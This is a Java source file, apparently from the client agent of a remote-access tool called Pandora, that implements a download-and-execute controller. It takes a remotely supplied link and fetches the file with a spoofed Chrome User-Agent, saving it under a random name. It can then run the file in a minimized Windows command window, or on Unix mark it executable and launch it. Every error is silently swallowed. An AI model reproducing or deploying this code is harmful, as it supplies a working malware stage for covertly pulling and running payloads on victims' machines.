package org.pandora.agent.control.impl;

import org.pandora.agent.Client;
import org.pandora.agent.utils.BooleanUtils;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

public class DownloaderController {

    private final Client client;

    public DownloaderController(final Client client) {
        this.client = client;
    }

    public void run(String link, final String autoStartStr, String location) {
        link = link.replace("(doubleDot)", ":");
        location = location.replace("(doubleDot)", ":");

        if (location.equals("null")) {
            final File file = new File(this.client.isWindows() ? System.getenv("LOCALAPPDATA") + "\\Downloads\\" : "/etc/downloader/");
            file.mkdirs();
            location = file.getAbsolutePath();
        }

        if (!BooleanUtils.isBoolean(autoStartStr)) return;
        final String fileName = new Random().nextInt(Integer.MAX_VALUE) + link.substring(link.lastIndexOf('/') + 1);

        this.download(link, location, fileName);
        if (Boolean.parseBoolean(autoStartStr)) this.open(location, fileName);
    }

    private void download(final String link, final String location, final String fileName) {
        final URL url;
        final URLConnection con;
        final DataInputStream dis;
        final FileOutputStream fos;
        final byte[] fileData;
        final File dir = new File(location);
        final File tempPath = new File(location + (this.client.isWindows() ? "\\" : "/") + fileName);
        if (!dir.exists()) dir.mkdirs();
        if (!tempPath.exists()) {
            try {
                url = new URL(link);
                con = url.openConnection();
                con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
                dis = new DataInputStream(con.getInputStream());
                fileData = new byte[con.getContentLength()];
                for (int q = 0; q < fileData.length; q++) fileData[q] = dis.readByte();
                dis.close();
                fos = new FileOutputStream(tempPath);
                fos.write(fileData);
                fos.close();
            } catch (final Exception ignore) {
            }
        }
    }

    private void open(final String location, final String fileName) {
        final File file = new File(location + (this.client.isWindows() ? "\\" : "/") + fileName);
        if (!file.exists()) return;
        try {
            if (this.client.isWindows())
                Runtime.getRuntime().exec("cmd.exe /c start /min cmd.exe /c \"" + file.getAbsolutePath() + "\"");
            else {
                if (fileName.endsWith(".jar"))
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; java -jar " + fileName});
                else if (fileName.endsWith(".sh"))
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; sh " + fileName});
                else
                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "chmod +x " + file.getAbsolutePath() + "; cd " + location + "; ./" + fileName});
            }
        } catch (final IOException ignore) {
        }
    }
}
